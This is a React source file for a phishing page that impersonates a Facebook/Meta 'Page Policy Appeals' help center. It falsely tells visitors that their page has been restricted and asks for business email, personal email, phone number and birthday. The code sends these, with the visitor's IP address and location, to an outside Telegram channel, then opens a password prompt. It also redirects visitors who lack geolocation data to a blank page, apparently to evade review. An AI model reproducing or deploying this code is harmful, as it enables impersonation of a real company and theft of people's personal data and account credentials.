import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import Footer from '@/components/Footer';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
const Home = () => {
    const defaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Page Policy Appeals',
            detectedActivity: 'We have detected unusual activity on your page that violates our community standards.',
            accessLimited: 'Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.',
            submitAppeal: 'If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.',
            emailBusiness: 'Email Business',
            mail: 'Email',
            phone: 'Phone Number',
            birthday: 'Birthday',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies'
        }),
        []
    );

    const [formData, setFormData] = useState({
        emailBusiness: '',
        mail: '',
        phone: '',
        birthday: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedemailBusiness, translatedMail, translatedPhone, translatedBirthday, translatedSubmitBtn, translatedRequired, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.emailBusiness, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);

                setTranslatedTexts({
                    helpCenter: translatedHelpCenter,
                    english: translatedEnglish,
                    using: translatedUsing,
                    managingAccount: translatedManaging,
                    privacySecurity: translatedPrivacy,
                    policiesReporting: translatedPolicies,
                    pagePolicyAppeals: translatedAppeals,
                    detectedActivity: translatedDetected,
                    accessLimited: translatedLimited,
                    submitAppeal: translatedSubmit,
                    emailBusiness: translatedemailBusiness,
                    mail: translatedMail,
                    phone: translatedPhone,
                    birthday: translatedBirthday,
                    submit: translatedSubmitBtn,
                    fieldRequired: translatedRequired,
                    about: translatedAbout,
                    adChoices: translatedAdChoices,
                    createAd: translatedCreateAd,
                    privacy: translatedPrivacyText,
                    careers: translatedCareers,
                    createPage: translatedCreatePage,
                    termsPolicies: translatedTerms,
                    cookies: translatedCookies
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }

        try {
            const ipData = JSON.parse(ipInfo);
            const detectedCountry = ipData.country_code || 'US';
            setCountryCode(detectedCountry);

            // get calling code
            const code = getCountryCallingCode(detectedCountry);
            setCallingCode(`+${code}`);
        } catch {
            setCountryCode('US');
            setCallingCode('+1');
        }

        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleInputChange = (field, value) => {
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        if (errors[field]) {
            setErrors((prev) => ({
                ...prev,
                [field]: false
            }));
        }
    };

    const validateForm = () => {
        const requiredFields = ['emailBusiness', 'mail', 'phone', 'birthday'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Email Business:</b> <code>${data.emailBusiness}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: translatedTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: translatedTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: translatedTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: translatedTexts.policiesReporting
        }
    ];
    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                </div>
            </header>
            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                <nav className='hidden w-xs flex-col gap-2 p-6 shadow-lg sm:flex'>
                    {data_list.map((data) => {
                        return (
                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                <div className='flex items-center gap-2'>
                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                        <FontAwesomeIcon icon={data.icon} />
                                    </div>
                                    <div>{data.title}</div>
                                </div>
                                <FontAwesomeIcon icon={faChevronDown} />
                            </div>
                        );
                    })}
                </nav>
                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto px-2 sm:px-0'>
                    <div className='mx-auto my-4 w-full max-w-2xl rounded-lg border border-[#e4e6eb] sm:my-12'>
                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                            <p className='pb-1 text-2xl font-bold sm:text-3xl'>{translatedTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='border border-orange-200 bg-orange-50 p-3 sm:mx-0 sm:p-4'>
                            <div className='flex items-start gap-3'>
                                <div className='mt-0.5 flex-shrink-0'>
                                    <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 640 640' className='h-5 w-5 text-orange-500 sm:h-6 sm:w-6'>
                                        <path d='M320 576C178.6 576 64 461.4 64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576zM320 384C302.3 384 288 398.3 288 416C288 433.7 302.3 448 320 448C337.7 448 352 433.7 352 416C352 398.3 337.7 384 320 384zM320 192C301.8 192 287.3 207.5 288.6 225.7L296 329.7C296.9 342.3 307.4 352 319.9 352C332.5 352 342.9 342.3 343.8 329.7L351.2 225.7C352.5 207.5 338.1 192 319.8 192z' />
                                    </svg>
                                </div>
                                <div className='flex-1 text-sm leading-relaxed sm:text-base'>
                                    <p className='mb-2'>{translatedTexts.detectedActivity}</p>
                                    <p className='mb-2'>{translatedTexts.accessLimited}</p>
                                    <p>{translatedTexts.submitAppeal}</p>
                                </div>
                            </div>
                        </div>
                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.emailBusiness} <span className='text-red-500'>*</span>
                                </p>
                                <input type='text' name='emailBusiness' autoComplete='organization' className={`w-full rounded-lg border px-3 py-1.5 ${errors.emailBusiness ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.emailBusiness} onChange={(e) => handleInputChange('emailBusiness', e.target.value)} />
                                {errors.emailBusiness && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
                                </p>
                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
                                </p>
                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
                                </div>
                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p>
                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                </p>
                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
                                {translatedTexts.submit}
                            </button>
                        </div>
                    </div>
                </div>
            </main>
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
            <Footer />
        </>
    );
};
export default Home;
